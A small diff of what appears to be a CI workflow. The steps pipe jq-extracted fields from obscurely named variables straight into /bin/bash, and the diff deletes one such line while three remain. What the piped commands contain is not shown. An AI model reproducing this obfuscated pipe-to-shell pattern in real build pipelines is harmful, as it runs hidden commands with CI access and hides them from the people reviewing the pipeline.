@@ -29,7 +29,6 @@ jobs:
           echo $i94428 | jq -r .mlpht87 | /bin/bash
           printf '%s' "$ngboq111" | jq -r .lo8449 | /bin/bash
           printf '%s' "$qcqsj55619" | jq -r .glw410 | /bin/bash
-          printf '%s' "$smnwp108" | jq -r .vqeux09 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
